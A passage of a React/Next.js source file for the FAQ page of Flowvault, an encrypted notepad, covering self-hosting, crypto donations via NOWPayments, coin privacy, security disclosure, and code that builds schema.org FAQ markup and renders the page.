        <ul className="mt-3 list-disc space-y-1 pl-5">
          <li>
            <Strong>Frontend</Strong> (Next.js, all UI + client-side crypto)
          </li>
          <li>
            <Strong>Cloud Functions</Strong> (the trusted-handover
            release sweep). You can read exactly what server-side code runs on
            your behalf &mdash; there is no hidden server process.
          </li>
          <li>
            <Strong>Firestore security rules</Strong> (the actual boundary
            that keeps us from reading your data). These are short,
            auditable, and enforced by Google&apos;s infrastructure.
          </li>
        </ul>
        <p className="mt-3">
          You can self-host the entire stack: bring your own Firebase
          project, deploy the rules and Functions, point the frontend at it.
          A permissive license (MIT planned) lets you fork it freely.
        </p>
        <p className="mt-3">
          For comparison: <Strong>ProtectedText</Strong> publishes its
          client-side JavaScript so you can read it in the browser
          (commendable, and they encourage it), but their FAQ explicitly
          states &ldquo;we haven&apos;t opened the server code for now.&rdquo;
          They argue the server is irrelevant because all crypto happens in
          the client &mdash; which is a fair argument, but you still
          can&apos;t self-host their service or audit what their server does
          with your encrypted blobs (rate-limiting, logging, retention).
          Flowvault&apos;s answer is to put the server code, the database
          rules, and the deployment config in the same repo, so there
          is nothing to take on faith.
        </p>
      </>
    ),
  },
  {
    q: "How is Flowvault funded?",
    a: (
      <>
        Donations and personal time. We don&apos;t run ads, don&apos;t sell
        data, and don&apos;t have a paid tier (yet). The project intentionally
        doesn&apos;t have the usual revenue levers because those levers tend
        to be the opposite of privacy. Hosting, domain, and drand beacon
        monitoring costs come out of pocket and out of donations.
      </>
    ),
  },
  {
    q: "I want to support Flowvault. What helps?",
    a: (
      <>
        <Strong>Crypto donations</Strong> are the main channel. The{" "}
        <Link href={DONATE_PATH} className="text-accent hover:underline">
          /donate
        </Link>{" "}
        page embeds the{" "}
        <a
          href="https://nowpayments.io"
          target="_blank"
          rel="noreferrer"
          className="text-accent hover:underline"
        >
          NOWPayments
        </a>{" "}
        donation widget: pick any of ~100+ coins (Bitcoin, Ethereum,
        Litecoin, Monero, USDT on TRC-20 or ERC-20, Solana, and many
        more), the widget generates a one-time deposit address, and
        your wallet sends funds directly. <Strong>No donor sign-up, no
        email required.</Strong> Even the equivalent of a coffee
        genuinely helps.
        <br />
        <br />
        Not in a position to donate? Use Flowvault, tell someone who
        needs it, star the GitHub repo, file a bug, or submit a PR. All
        of those matter just as much.
      </>
    ),
  },
  {
    q: "Why crypto instead of a regular card or PayPal?",
    a: (
      <>
        Because every traditional payment rail asks for identifying
        information &mdash; card number, email, billing address, country
        &mdash; which defeats the point of a zero-knowledge product.
        Accepting crypto lets us receive your support without also
        receiving a dossier on you. If crypto is a non-starter for you,
        we&apos;re not offended; please just don&apos;t feel pressured.
      </>
    ),
  },
  {
    q: "Why NOWPayments specifically, and what does it see about me?",
    a: (
      <>
        NOWPayments&apos; donation widget is one of the few processors
        that lets a donor contribute <Strong>without creating an
        account or providing an email</Strong> &mdash; receipts are
        optional and only needed if the donor wants one. It also
        generates a fresh deposit address per donation, so later donors
        can&apos;t cross-reference each other on-chain. On our side we
        just receive the forwarded funds.
        <br />
        <br />
        What NOWPayments sees on the donor side: your IP and your
        browser when you interact with their widget (same as any
        website you load). They don&apos;t require an email, and
        they don&apos;t require KYC for a donation. If that isn&apos;t
        private enough for you, load the page through Tor or a VPN
        &mdash; both work &mdash; and send Monero, which hides amount
        and identity at the protocol level. We don&apos;t receive any
        of that metadata either way.
      </>
    ),
  },
  {
    q: "Which coin should I send?",
    a: (
      <>
        If privacy is paramount, send <Strong>Monero (XMR)</Strong>. Every
        other major chain &mdash; Bitcoin, Ethereum, Litecoin, USDT, Solana
        &mdash; is pseudonymous: the full history of transactions to an
        address is public, so anyone who ever learns a donation address
        later can see the full ledger. Monero hides amounts, senders, and
        receivers by design. For low fees on stablecoins, USDT on TRC-20
        (Tron) is a good choice.
      </>
    ),
  },
  {
    q: "How do I report a security issue?",
    a: "Please use GitHub security advisories or email the maintainer privately before public disclosure. We'll credit responsible disclosures.",
  },
];

/**
 * Block-level element types that should get a space break when we
 * flatten a React tree into plaintext for schema.org answers.
 */
const BLOCK_TAGS = new Set([
  "p",
  "div",
  "li",
  "ol",
  "ul",
  "br",
  "h1",
  "h2",
  "h3",
  "h4",
  "h5",
  "h6",
]);

/**
 * Recursively walk a React node and concatenate its text children.
 *
 * We can&apos;t use `renderToStaticMarkup` in Next 16 Server Components
 * (the framework rejects any `react-dom/server` import). Walking the
 * element tree manually keeps us fully server-safe and avoids any
 * runtime cost on the client.
 */
function nodeToText(node: ReactNode): string {
  const raw = walk(node);
  return raw.replace(/\s+/g, " ").trim();
}

function walk(node: ReactNode): string {
  if (node === null || node === undefined || typeof node === "boolean") {
    return "";
  }
  if (typeof node === "string" || typeof node === "number") {
    return String(node);
  }
  if (Array.isArray(node)) {
    return node.map(walk).join("");
  }
  if (isValidElement(node)) {
    const el = node as React.ReactElement<{ children?: ReactNode }>;
    const type = el.type;
    const tag = typeof type === "string" ? type.toLowerCase() : "";
    const inner = walk(el.props?.children);
    return BLOCK_TAGS.has(tag) ? ` ${inner} ` : inner;
  }
  return "";
}

/** Build a schema.org FAQPage JSON-LD payload from every QA list. */
function buildFaqJsonLd(groups: QA[][]) {
  const mainEntity = groups.flat().map((item) => ({
    "@type": "Question",
    name: item.q,
    acceptedAnswer: {
      "@type": "Answer",
      text:
        typeof item.a === "string" ? item.a : nodeToText(item.a),
    },
  }));
  return {
    "@context": "https://schema.org",
    "@type": "FAQPage",
    mainEntity,
  };
}

export default function FAQPage() {
  const jsonLd = buildFaqJsonLd([
    ABOUT,
    VS_PROTECTED_TEXT,
    SECURITY,
    FEATURES,
    USAGE,
    MARKDOWN,
    SEARCH,
    BYOS,
    BACKUP,
    COMPANY,
  ]);
  return (
    <>
      <Navbar />
      <main className="mx-auto w-full max-w-3xl flex-1 px-4 py-12 text-[15px] leading-relaxed text-foreground">
        <h1 className="text-3xl font-semibold tracking-tight">
          Flowvault FAQ
        </h1>
        <p className="mt-3 text-muted">
          Questions we get (or expect to get) about our zero-knowledge
          encrypted notepad, the Markdown preview with
          security-first defaults (blocked HTML, click-to-load
          external images, no-referrer external links,
          locally-highlighted code blocks), the{" "}
          <Code>Cmd</Code>+<Code>K</Code> command-palette search that
          runs entirely in memory over the notebooks you&apos;ve
          already unlocked, Bring-Your-Own-Storage local vaults stored
          as a single <Code>.flowvault</Code> file on your device,
          the trusted handover to a beneficiary, drand-backed
          time-locked notes, Encrypted Send, <Code>.fvault</Code>{" "}
          encrypted backups and restore, and how Flowvault compares
          to ProtectedText, Standard Notes, CryptPad, and other
          alternatives. If yours isn&apos;t here, open an issue on
          GitHub.
        </p>

        <Section title="About Flowvault" items={ABOUT} />
        <Section
          title="Comparisons: Flowvault vs ProtectedText, Standard Notes, CryptPad, Privnote, and other encrypted notepads"
          items={VS_PROTECTED_TEXT}
        />
        <Section title="Security" items={SECURITY} />
        <Section
          title="Trusted handover & time-locked notes"
          items={FEATURES}
        />
        <Section title="Using Flowvault" items={USAGE} />
        <Section
          title="Markdown preview & syntax-highlighted code blocks"
          items={MARKDOWN}
        />
        <Section
          title="Cmd+K search (in-memory only, scoped to your unlocked session)"
          items={SEARCH}
        />
        <Section
          title="Bring Your Own Storage (local .flowvault files; S3 / WebDAV on the roadmap)"
          items={BYOS}
        />
        <Section
          title="Backup, restore & migration (.fvault, Markdown export, self-hosting)"
          items={BACKUP}
        />
        <Section title="Project" items={COMPANY} />

        <section className="mt-12 rounded-2xl border border-border bg-background-elev p-6 text-sm text-muted">
          <h2 className="text-foreground font-medium">
            Want a longer answer?
          </h2>
          <p className="mt-2">
            The{" "}
            <Link href="/blog" className="text-accent hover:underline">
              Flowvault blog
            </Link>{" "}
            has feature-by-feature deep dives: the{" "}
            <Link
              href="/blog/plausible-deniability-hidden-volumes-explained"
              className="text-accent hover:underline"
            >
              hidden-volume format
            </Link>
            , the{" "}
            <Link
              href="/blog/trusted-handover-encrypted-notes-beneficiary"
              className="text-accent hover:underline"
            >
              trusted handover
            </Link>
            ,{" "}
            <Link
              href="/blog/time-locked-notes-drand-tlock"
              className="text-accent hover:underline"
            >
              drand-backed time-locked notes
            </Link>
            , an honest{" "}
            <Link
              href="/blog/flowvault-vs-protectedtext"
              className="text-accent hover:underline"
            >
              Flowvault vs ProtectedText head-to-head
            </Link>
            , a head-to-head of{" "}
            <Link
              href="/blog/encrypted-send-vs-bitwarden-send-privnote"
              className="text-accent hover:underline"
            >
              Encrypted Send vs Bitwarden Send vs Privnote
            </Link>
            , the{" "}
            <Link
              href="/blog/encrypted-backup-fvault-format"
              className="text-accent hover:underline"
            >
              <Code>.fvault</Code> backup format
            </Link>
            , a{" "}
            <Link
              href="/blog/how-to-use-flowvault-guide"
              className="text-accent hover:underline"
            >
              beginner&apos;s guide
            </Link>
            , and{" "}
            <Link
              href="/blog/why-i-built-flowvault"
              className="text-accent hover:underline"
            >
              why Flowvault exists in the first place
            </Link>
            .
          </p>
        </section>
      </main>
      <footer className="border-t border-border/60 py-6 text-center text-xs text-muted">
        Flowvault · part of the Flowdesk family
      </footer>
      <script
        type="application/ld+json"
        // `dangerouslySetInnerHTML` is the standard way to emit JSON-LD
        // in Next.js without escaping the payload into HTML entities.
        dangerouslySetInnerHTML={{
          __html: JSON.stringify(jsonLd).replace(/</g, "\\u003c"),
        }}
      />
    </>
  );
}

function Section({ title, items }: { title: string; items: QA[] }) {
  return (
    <section className="mt-10">
      <h2 className="text-xl font-semibold">{title}</h2>
      <div className="mt-4 divide-y divide-border rounded-xl border border-border bg-background-elev">
        {items.map((item) => (
          <details
            key={item.q}
            className="group px-5 py-4 [&_summary::-webkit-details-marker]:hidden"
          >
            <summary className="flex cursor-pointer list-none items-center justify-between gap-4 text-left">
              <span className="font-medium text-foreground">{item.q}</span>
              <span className="shrink-0 text-muted transition-transform group-open:rotate-45">
                +
              </span>
            </summary>
            <div className="mt-3 text-sm leading-relaxed text-muted">
              {item.a}
            </div>
          </details>
        ))}
      </div>
    </section>
  );
}

function Code({ children }: { children: React.ReactNode }) {
  return (
    <code className="rounded bg-background-elev-2 px-1.5 py-0.5 font-mono text-xs text-foreground">
      {children}
    </code>
  );
}

function Strong({ children }: { children: React.ReactNode }) {
  return <strong className="text-foreground">{children}</strong>;
}
